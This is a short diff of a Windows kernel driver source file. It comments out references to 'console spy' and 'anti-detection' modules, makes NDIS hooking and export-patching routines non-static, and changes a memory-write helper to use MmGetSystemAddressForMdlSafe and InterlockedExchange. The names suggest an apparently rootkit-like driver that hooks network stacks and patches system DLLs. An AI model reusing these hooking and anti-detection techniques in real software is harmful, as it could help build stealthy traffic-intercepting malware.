@@ -77,24 +77,24 @@ UINT g_uiServiceNameLen = 0;
 
 UNICODE_STRING g_ImagePath;
 
-extern BOOLEAN s_LoggingInit;
-extern BOOLEAN s_ConsoleSpyInit;
-extern BOOLEAN s_AntiDetectionInit;
+//extern BOOLEAN s_LoggingInit;
+//extern BOOLEAN s_ConsoleSpyInit;
+//extern BOOLEAN s_AntiDetectionInit;
 KEVENT g_TDIThreadStartEvent;
 
 PETHREAD g_TDIThreadObject = NULL;
 
 /* prototypes */
 
-static NTSTATUS		DeviceDispatch(IN CONST PDEVICE_OBJECT DeviceObject, IN PIRP irp);
-static VOID			OnUnload(IN PDRIVER_OBJECT);
+NTSTATUS		DeviceDispatch(IN CONST PDEVICE_OBJECT DeviceObject, IN PIRP irp);
+VOID			OnUnload(IN PDRIVER_OBJECT);
 
-static NTSTATUS		hook_ndis(int unhook);
+NTSTATUS		hook_ndis(int unhook);
 
-static void			*find_system_dll(const char *name);
-static void			*fix_export(char *base, const char *fn, const void *new_fn);
+void			*find_system_dll(const char *name);
+void			*fix_export(char *base, const char *fn, const void *new_fn);
 
-static BOOLEAN		replace_value_safe(ULONG *addr, ULONG value);
+BOOLEAN			replace_value_safe(ULONG *addr, ULONG value);
 
 /**
  * Main driver function
@@ -111,7 +111,7 @@ DriverEntry(IN PDRIVER_OBJECT theDriverObject,
 
  	memtrack_init();
 	init_adapter_list();
-	(void)GetProcessNameOffset();
+	GetProcessNameOffset();
 	
 	if(!theRegistryPath || !theDriverObject)
 		return STATUS_UNSUCCESSFUL;
@@ -436,9 +436,9 @@ replace_value_safe(ULONG *addr, ULONG value)
 		return FALSE;
 	}
 
-	virt_addr = (ULONG *)MmGetSystemAddressForMdl(mdl);
+	virt_addr = (ULONG *)MmGetSystemAddressForMdlSafe(mdl, HighPagePriority);
 
-	*(ULONG *)virt_addr = value;
+	InterlockedExchange(virt_addr, value);
 
 	MmUnlockPages(mdl);
 	IoFreeMdl(mdl);
